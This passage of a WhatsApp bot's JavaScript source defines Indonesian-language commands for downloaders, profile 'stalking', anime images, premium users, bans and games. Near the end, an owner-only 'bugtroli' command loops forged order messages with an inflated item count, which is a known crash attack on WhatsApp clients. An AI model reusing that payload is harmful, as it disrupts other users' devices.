└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
                        const captionis = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionis, msg)
                            sendFileFromUrl(from, dl_link, '', msg)
                            limitAdd(sender, limit)
                        })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    sendMess(ownerNumber, 'PlayMp3 Error : ' + err)
                    console.log(color('[PlayMp3]', 'red'), err)
                    reply(mess.error.api)
                }
            }
                break
            case prefix+'ig':
            case prefix+'igdl':
            case prefix+'instagram':{
                if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium , Mau beli? Ketik ${prefix}donasi`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ig* link ig`)
                if (!isUrl(args[1]) && !args[1].includes('instagram.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                getPost(args[1].split('/')[4])
                .then((res) => {
                    let { owner_user, post, date, capt } = res
                    let caption = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM MEDIA*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Owner : ${owner_user}\`\`\`
\`\`\`▢ Jumlah Media : ${post.length}\`\`\`
\`\`\`▢ Caption :${capt}\`\`\`

_Harap tunggu sebentar, media akan segera dikirim_`
                    sendMess(from, caption)
                    for (let i = 0; i < post.length; i++){
                        sendFileFromUrl(from, post[i].url)
                    }
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    sendMess(ownerNumber, 'IG Download Error : ' + err)
                    console.log(color('[IG Download]', 'red'), err)
                    reply(mess.error.api)
                })
            }
                break
            case prefix+'fb':
            case prefix+'fbdl':
            case prefix+'facebook':{
		if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User premium , Mau beli? Ketik ${prefix}donasi`) 
                if (args.length < 2) return reply(`Kirim perintah *${prefix}fb* url`)
                if (!isUrl(args[1]) && !args[1].includes('facebook.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                fbdl(args[1])
                .then((res) => {
                    sendFileFromUrl(from, res.result.links[0].url)
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    sendMess(ownerNumber, 'FB Error : ' + err)
                    console.log(color('[FB]', 'red'), err)
                    reply(mess.error.api)
                })
            }
                break
            case prefix+'yts':
            case prefix+'ytsearch':{
                if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium , Mau Beli User Premium? Ketik ${prefix}donasi`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ytsearch* _query_`)
                reply(mess.wait)
                yts(q)
                .then((res) => {
                    let yt = res.videos
                    let txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
*Hasil Pencarian : ${q}*\n`
                    for (let i = 0; i < 10; i++){
                        txt += `\n─────────────────\n\n\`\`\`▢ Judul : ${yt[i].title}\n\`\`\`▢ ID : ${yt[i].videoId}\n\`\`\`▢ Upload : ${yt[i].ago}\n\`\`\`▢ Ditonton : ${yt[i].views}\n\`\`\`▢ Duration : ${yt[i].timestamp}\n\`\`\`▢ URL : ${yt[i].url}\n`
                    }
                    sendFileFromUrl(from, yt[0].image, txt, msg)
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    sendMess(ownerNumber, 'YT SEARCH Error : ' + err)
                    console.log(color('[YT SEARCH]', 'red'), err)
                    reply(mess.error.api)
                })
            }
                break
	case prefix+'tiktok': {
		if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium , Mau Beli User Premium? Ketik donasi`)
                if (args.length < 2) return reply(`Penggunaan ${command} link tiktok`)
                if (!isUrl(args[1]) && !args[1].includes('tiktok.com')) return reply(mess.error.Iv)
                reply(mess.wait)
                axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${args[1]}`)
                .then(({data}) => {
                    let { title, thumbnail, description, duration, link } = data.result
                    let capt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ TIKTOK NOWM DOWNLOADER
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Username / Nickname : ${data.result.author.username} / ${data.result.author.nickname}\`\`\`
\`\`\`▢ Duration : ${duration}\`\`\`
\`\`\`▢ LikeCount : ${data.result.statistic.diggCount}\`\`\`
\`\`\`▢ ShareCount : ${data.result.statistic.shareCount}\`\`\`
\`\`\`▢ CommentCount : ${data.result.statistic.commentCount}\`\`\`
\`\`\`▢ PlayCount : ${data.result.statistic.playCount}\`\`\`
\`\`\`▢ Descripttion : ${description}\`\`\`
`
                    sendFileFromUrl(from, thumbnail, capt, msg)
                    sendFileFromUrl(from, link, '', msg)
                    limitAdd(sender, limit)
                })
                    .catch((err) => {
                        sendMess(ownerNumber, 'TiktokWM Error : ' + err)
                        console.log(color('[TiktokWM]', 'red'), err)
                        reply(mess.error.api)
                    })
            }
                break
//------------------< Stalker >-------------------
            case prefix+'igstalk': case prefix+'stalkig':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}igstalk* _username_`)
                reply(mess.wait)
                getUser(args[1].replace('@', ''))
                .then((res) => {
                    let { username, biography, fullName, subscribersCount, subscribtions, highlightCount, isBusinessAccount, isPrivate, isVerified, profilePicHD, postsCount } = res
                    let caption = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${username}\`\`\`
\`\`\`▢ Fullname : ${fullName}\`\`\`
\`\`\`▢ Followers : ${subscribersCount}\`\`\`
\`\`\`▢ Following : ${subscribtions}\`\`\`
\`\`\`▢ Post Count : ${postsCount}\`\`\`
\`\`\`▢ HighlightCount : ${highlightCount}\`\`\`
\`\`\`▢ PrivateAccount : ${isPrivate ? 'Yes' : 'No'}\`\`\`
\`\`\`▢ VerifiedAccount : ${isVerified ? 'Yes' : 'No'}\`\`\`
\`\`\`▢ BusinessAccount : ${isBusinessAccount ? 'Yes' : 'No'}\`\`\`
\`\`\`▢ Biography :\`\`\` \n${biography}`
                    sendFileFromUrl(from, profilePicHD, caption, msg)
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    sendMess(ownerNumber, 'IG Stalk Error : ' + err)
                    console.log(color('[IG Stalk]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
            case prefix+'ghstalk': case prefix+'githubstalk': case prefix+'ghuser':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ghstalk* _username_`)
                reply(mess.wait)
                axios.get(`https://api.github.com/users/${args[1]}`)
                .then((res) => res.data)
                .then((res) =>{
                    let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
                    let txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${login}\`\`\`
\`\`\`▢ Name : ${name}\`\`\`
\`\`\`▢ Followers : ${followers}\`\`\`
\`\`\`▢ Following : ${following}\`\`\`
\`\`\`▢ Created at :  ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\`\`\`
\`\`\`▢ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\`\`\`
\`\`\`▢ Public Gists : ${public_gists}\`\`\`
\`\`\`▢ Public Repos : ${public_repos}\`\`\`
\`\`\`▢ Twitter : ${twitter_username}\`\`\`
\`\`\`▢ Email : ${email}\`\`\`
\`\`\`▢ Location : ${location}\`\`\`
\`\`\`▢ Blog : ${blog}\`\`\`
\`\`\`▢ Link : ${html_url}\`\`\`
\`\`\`▢ Bio :\`\`\`\n${bio}`
                    sendFileFromUrl(from, avatar_url, txt, msg)
                    limitAdd(sender, limit)
                })
                .catch((err) => {
                    sendMess(ownerNumber, 'GH Stalk Error : ' + err)
                    console.log(color('[GH Stalk]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
            case prefix+'pinterest':
                if (!isPremium) return reply(mess.OnlyPrem)
                if (args.length === 1) return reply(`Kirim perintah *${prefix}pinterest query*`)

                async function pinterestSearch(query) {
                    return new Promise((resolve, reject) => {
                        fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`, {
                            "headers": {
                                "accept": "application/json, text/javascript, */*, q=0.01",
                                "accept-language": "en-US,en;q=0.9",
                                "cache-control": "no-cache",
                                "pragma": "no-cache",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "same-origin",
                                "sec-gpc": "1",
                                "x-app-version": "9a236a4",
                                "x-pinterest-appstate": "active",
                                "x-requested-with": "XMLHttpRequest"
                            },
                            "referrer": "https://www.pinterest.com/",
                            "referrerPolicy": "origin",
                            "body": null,
                            "method": "GET",
                            "mode": "cors"
                        }).then((res) => res.json())
                            .then((json) => {
                                const generatepin = json.resource_response.data.results[Math.floor(Math.random() * (json.resource_response.data.results.length))]
                                var result = [];
                                result.push({
                                    link: generatepin.images.orig.url
                                })
                                resolve(result)
                            }).catch(reject)
                    })
                }

                const pinterest = (query) => new Promise((resolve, reject) => {
                    pinterestSearch(query).then((data) => {
                        resolve({
                            status: 200,
                            image: data[0].link
                        })
                    }).catch(reject)
                })

                pinterest(q).then(async(res) => {
                    await reply(mess.wait)
                    await sendFileFromUrl(from, res.image, `Hasil Pencarian: ${q}`, msg)
                }).catch(async(err) => {
                    sendMess(ownerNumber, 'Pinterest Error : ' + err)
                    console.log(color('[Pinterest]', 'red'), err)
                    reply(mess.error.api)
                })
                break
//------------------< VVIBU >-------------------
			case prefix+'waifu':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                reply(mess.wait)
						axios.get('https://waifu.pics/api/sfw/waifu')
						.then(res => res.data)
						.then(res =>
						sendFileFromUrl(from, res.url, 'NIH ANJINK', msg)
						)					
                        .catch((err) => {
                    console.log(color('[Vvibu]', 'red'), err)
                    reply(mess.error.api)
                })
                            limitAdd(sender, limit)
                            }
                            break
			case prefix+'nekonime':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                reply(mess.wait)
						axios.get('https://waifu.pics/api/sfw/neko')
						.then(res => res.data)
						.then(res =>
						sendFileFromUrl(from, res.url, 'NIH NGENTOD', msg)
						)					
                        .catch((err) => {
                    console.log(color('[Vvibu]', 'red'), err)
                    reply(mess.error.api)
                })
                            limitAdd(sender, limit)
                            }
                            break
			case prefix+'megumin':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                reply(mess.wait)
						axios.get('https://waifu.pics/api/sfw/megumin')
						.then(res => res.data)
						.then(res =>
						sendFileFromUrl(from, res.url, 'NIH ASU', msg)
						)					
                        .catch((err) => {
                    console.log(color('[Vvibu]', 'red'), err)
                    reply(mess.error.api)
                })
                limitAdd(sender, limit)
            }
                break
			case prefix+'shinobu':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                reply(mess.wait)
						axios.get('https://waifu.pics/api/sfw/shinobu')
						.then(res => res.data)
						.then(res =>
						sendFileFromUrl(from, res.url, 'NIH TOD', msg)
						)					
                        .catch((err) => {
                    console.log(color('[Vvibu]', 'red'), err)
                    reply(mess.error.api)
                })
                limitAdd(sender, limit)
            }
                break
            case prefix+'loli':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/random/loli?apikey=${lolkey}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
            case prefix+'sagiri':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/random/sagiri?apikey=${lolkey}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
//------------------< Premium >-------------------
            case prefix+'addprem':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}addprem* @tag waktu\n*${prefix}addprem* nomor waktu\n\nContoh : ${command} @tag 30d`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    _prem.addPremiumUser(mentioned[0], args[2], premium)
                    }
                    reply('Sukses')
                } else {
                    _prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
                    reply('Sukses')
                }
                break
            case prefix+'delprem':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                        premium.splice(_prem.getPremiumPosition(mentioned[i], premium), 1)
                        fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    }
                    reply('Sukses')
                } else {
                    premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                }
                break
            case prefix+'cekprem':
            case prefix+'cekpremium':
                if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let premiumnya = `*Expirex :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                reply(premiumnya)
                break
            case prefix+'listprem':
                let txt = `List Prem\nJumlah : ${premium.length}\n\n`
                let men = [];
                for (let i of premium){
                    men.push(i.id)
                    let cekvip = ms(i.expired - Date.now())
                    txt += `*ID :* @${i.id.split("@")[0]}\n*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                }
                mentions(txt, men, true)
                break
//------------------< BAN >-------------------
            case prefix+'ban':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                        addBanned(mentioned[0], args[2], ban)
                    }
                    reply('Sukses')
                } else if (isQuotedMsg) {
                    if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa ban Owner`)
                    addBanned(quotedMsg.sender, args[1], ban)
                    reply(`Sukses ban target`)
                } else if (!isNaN(args[1])) {
                    addBanned(args[1] + '@s.whatsapp.net', args[2], ban)
                    reply('Sukses')
                } else {
                    reply(`Kirim perintah ${prefix}ban @tag atau nomor atau reply pesan orang yang ingin di ban`)
                }
                break
            case prefix+'unban':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                        unBanned(mentioned[i], ban)
                    }
                    reply('Sukses')
                }if (isQuotedMsg) {
                    unBanned(quotedMsg.sender, ban)
                    reply(`Sukses unban target`) 
                } else if (!isNaN(args[1])) {
                    unBanned(args[1] + '@s.whatsapp.net', ban)
                    reply('Sukses')
                } else {
                    reply(`Kirim perintah ${prefix}unban @tag atau nomor atau reply pesan orang yang ingin di unban`)
                }
                break
            case prefix+'listban':
                let txtx = `List Banned\nJumlah : ${ban.length}\n\n`
                let menx = [];
                for (let i of ban){
                    menx.push(i.id)
                    txtx += `*ID :* @${i.id.split("@")[0]}\n`
                    if (i.expired === 'PERMANENT'){
                        let cekvip = 'PERMANENT'
                        txtx += `*Expire :* PERMANENT\n\n`
                    } else {
                        let cekvip = ms(i.expired - Date.now())
                        txtx += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                    }
                }
                mentions(txtx, menx, true)
                break
//------------------< Game >-------------------
                case prefix+'topbalance':{
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOP BALANCE 」 ──*\n\n'
                let arrTop = []
                for (let i = 0; i < 10; i ++){
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
            }
                break
            case prefix+'buylimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                let ane = Number(nebal(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, nebal(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
                break
            case prefix+'buygamelimit':
            case prefix+'buyglimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                let ane = Number(nebal(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                givegame(sender, nebal(args[1]), glimit)
                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
                break
            case prefix+'tictactoe': case prefix+'ttt': case prefix+'ttc':
                if (!isGroup)return reply(mess.OnlyGrup)
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (isTicTacToe(from, tictactoe)) return reply(`Masih ada game yg blum selesai`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                if (mentioned.length !== 0){
						if (mentioned[0] === sender) return reply(`Sad amat main ama diri sendiri`)
                        let h = randomNomor(100)
                        mentions(monospace(`@${sender.split('@')[0]} menantang @${mentioned[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/T) untuk bermain\n\nHadiah : ${h} balance`), [sender, mentioned[0]], false)
                        tictactoe.push({
                            id: from,
                            status: null,
                            hadiah: h,
                            penantang: sender,
                            ditantang: mentioned[0],
                            TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                        })
                        gameAdd(sender, glimit)
                } else {
                    reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                }
                break
            case prefix+'delttt':
            case prefix+'delttc':
                if (!isGroup)return reply(mess.OnlyGrup)
                if (!isTicTacToe(from, tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
                tictactoe.splice(getPosTic(from, tictactoe), 1)
                reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                break
            case prefix+'tebakgambar':{
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
                let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=${lolkey}`)
                const petunjuk = anu.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                sendFileFromUrl(from, anu.data.result.image, monospace(`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu}s`), msg)
                let anih = anu.data.result.answer.toLowerCase()
                game.addgambar(from, anih, gamewaktu, tebakgambar)
                gameAdd(sender, glimit)
            }
                break
            case prefix+'family100':{
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
                let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolkey}`)
                reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
                let anoh = anu.data.result.aswer
                let rgfds = []
                for (let i of anoh){
                    let fefs = i.split('/') ? i.split('/')[0] : i
                    let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
                    let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                    rgfds.push(axsf.toLowerCase())
                }
                game.addfam(from, rgfds, gamewaktu, family100)
                gameAdd(sender, glimit)
                }
                    break
            case prefix+'suit':
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (args.length < 2) return reply(`Penggunaan ${command} gunting/kertas/batu\n\nContoh : ${command} gunting`)
                let suit = ["gunting", "batu", "kertas"];
                let isSuit = suit.includes(q)
                if (isSuit){
                    let suit1 = suit[Math.floor(Math.random() * (suit.length))]
                    let hadi = randomNomor(30)
                    if (q === suit[0]){
                        if (suit1 === "gunting"){
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nseri`)
                        } else if (suit1 === "batu"){
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nKamu kalah`)
                        } else {
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nKamu menang\nHadiah : ${hadi} balance`)
                            addBalance(sender, hadi, balance)
                        }
                    } else if (q === suit[1]){
                        if (suit1 === "batu"){
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nSeri`)
                        } else if (suit1 === "kertas"){
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nKamu kalah`)
                        } else {
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nKamu menang\nHadiah : ${hadi} balance`)
                            addBalance(sender, hadi, balance)
                        }
                    } else if (q === suit[2]){
                        if (suit1 === "kertas"){
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nSeri`)
                        } else if (suit1 === "gunting"){
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nKamu kalah`)
                        } else {
                            reply(`Kamu ${q}\nKomputer  ${suit1}\nKamu menang\nHadiah : ${hadi} balance`)
                            addBalance(sender, hadi, balance)
                        }
                    }
                    gameAdd(sender, glimit)
                } else {
                    reply(body.replace(args[1], "*"+args[1]+"*")+'\n\n'+`Tidak ada pilihan ${args[1]}`+`\nContoh : ${command} gunting`)
                }
                break
//------------------< Owner >-------------------
            case prefix+'setpp': case prefix+'setppbot':
            case prefix+'setpic': case prefix+'setpicbot':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadMediaMessage(encmedia)
                    xinz.updateProfilePicture(xinz.user.jid, media)
                    reply(`done`)
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
                break
            case prefix+'setname':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} XinzBot`)
                xinz.updateProfileName(q)
                reply(`sukses mengubah name`)
            }
                break
            case prefix+'setbio':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} XinzBot`)
                xinz.setStatus(q)
                reply(`sukses mengubah bio`)
            }
                break
            case prefix+'self':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                mode = 'self'
                textImg('Berhasil berubah ke mode self')
            }
                break
            case prefix+'publik': case prefix+'public':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                mode = 'public'
                textImg('Berhasil berubah ke mode public')
            }
                break
            case prefix+'clearall':{
                if (!isOwner) return reply(mess.OnlyOwner)
                let chiit = await xinz.chats.all()
                for (let i of chiit){
                    xinz.modifyChat(i.jid, 'delete', {
                        includeStarred: false
                    })
                }
                reply(`Selesai`)
            }
                break 
            case prefix+'setprefix':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
                if (q === 'multi'){
                    multi = true
                    textImg(`Berhasil mengubah prefix ke ${q}`)
                } else if (q === 'nopref'){
                    multi = false
                    nopref = true
                    textImg(`Berhasil mengubah prefix ke ${q}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${q}`
                    textImg(`Berhasil mengubah prefix ke ${q}`)
                }
                break
            case prefix+'setthumb':
                if (!isOwner) return reply(mess.OnlyOwner)
                    if (!isQuotedImage) return reply('Reply imagenya kak!')
                    const messimagethumb = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    const downiamgethumb = await xinz.downloadMediaMessage(messimagethumb)
                    fs.unlinkSync(`${setting.pathImg}`)
                    await sleep(2000)
                    fs.writeFileSync(`${setting.pathImg}`, downiamgethumb)
                    reply('Succes')
                    break
                case prefix+'bc':
		    if (!isOwner) return reply('Kamu Owner??')
		    if (args.length < 1) return reply('Mau Ngapain?')
		    let anu = await xinz.chats.all()
		    if (isImage || isQuotedImage) {
			const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			buff = await xinz.downloadMediaMessage(encmedia)
			for (let _ of anu) {
			    xinz.sendMessage(_.jid, buff, image, {caption: `[ SKIMURA BOT BROADCAST ]\n\n${body.slice(4)}`})
			}
			reply('Suksess broadcast')
		    } else {
			for (let _ of anu) {
			    sendMess(_.jid, `[ SKIMURA BOT BROADCAST ]\n\n${body.slice(4)}`)
			}
			reply('Suksess broadcast')
		    }
		    break 
		case prefix+'bugtroli':
		if (!isGroup) return reply(mess.OnlyGrup)
		if (!isOwner) return reply(mess.OnlyOwner)
            for (let i = 0; i < args[0]; i++) {
            xinz.sendMessage(from, `Punten !!!`, MessageType.extendedText,{
            quoted: {
            key: {
            participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
       },
            message: {
            orderMessage: {
             itemCount: 99999999,
            status: 1,
            surface: 10,
            orderTitle: 'yahaha hayyuk',
            sellerJid: '0@s.whatsapp.net'
            }}}}, 0)
        }
           break
//------------------< G R U P >------------------- 
